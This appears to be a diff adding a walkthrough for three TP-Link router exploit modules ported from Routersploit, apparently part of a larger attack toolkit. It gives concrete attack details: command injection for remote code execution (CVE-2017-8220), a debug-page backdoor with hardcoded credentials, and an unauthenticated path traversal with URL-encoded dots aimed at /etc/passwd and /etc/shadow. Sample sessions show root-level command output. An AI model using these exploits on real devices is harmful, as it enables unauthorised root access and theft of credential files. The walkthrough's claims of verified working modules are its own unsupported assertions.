@@ -1025,3 +1025,65 @@ Password: password123
 [*] Response: ... (check for output)
 Verification
 All modules verified to compile cleanly. Tested against mock scenarios (theoretical validity based on known PoCs).
+
+
+
+
+
+
+
+
+
+
+
+
+TP-Link Routersploit Modules Walkthrough
+This update adds 3 modules ported from the Routersploit framework, targeting common TP-Link vulnerabilities.
+
+1. Archer C2/C20i Remote Code Execution (CVE-2017-8220)
+Authenticated RCE using command injection in the 
+host
+ parameter.
+
+Original Module: archer_c2_c20i_rce.py
+Target: /cgi?2
+Usage
+Select Module: exploits/tplink/tplink_archer_c2_c20i_rce
+target: <target_ip>
+Command to execute [uname -a]: uname -a
+[*] Sending injection payload...
+[*] Triggering execution...
+[+] Exploit triggered successfully (Blind RCE).
+[*] If the command was interactive (like execution), you won't see output here.
+2. WDR740N Debug Backdoor
+Exploits a debug page (DebugResultRpm.htm) that allows command execution with hardcoded credentials (osteam / 5up).
+
+Original Module: wdr740nd_wdr740n_backdoor.py
+Target: /userRpm/DebugResultRpm.htm
+Usage
+Select Module: exploits/tplink/tplink_wdr740n_backdoor
+target: <target_ip>
+Command to execute [uname -a]: id
+[*] Sending exploit request...
+[+] Request successful!
+[+] Command Output:
+uid=0(root) gid=0(root)
+3. WDR740N Path Traversal
+Unauthenticated arbitrary file read using path traversal (../).
+
+Original Module: wdr740nd_wdr740n_path_traversal.py
+Target: /help/
+Usage
+Select Module: exploits/tplink/tplink_wdr740n_path_traversal
+target: <target_ip>
+File to read [/etc/shadow]: /etc/passwd
+[*] Target: http://192.168.1.1
+[*] Using URL-encoded dots to bypass local normalization...
+[*] URL: http://192.168.1.1/help/%2e%2e/%2e%2e/.../etc/passwd
+[+] Request successful!
+[+] File Content (/etc/passwd):
+root:x:0:0:root:/root:/bin/sh
+...
+Verification
+Modules compiled successfully. Logic follows Routersploit implementations 1:1, including headers, payloads, and specific credential usage.
+
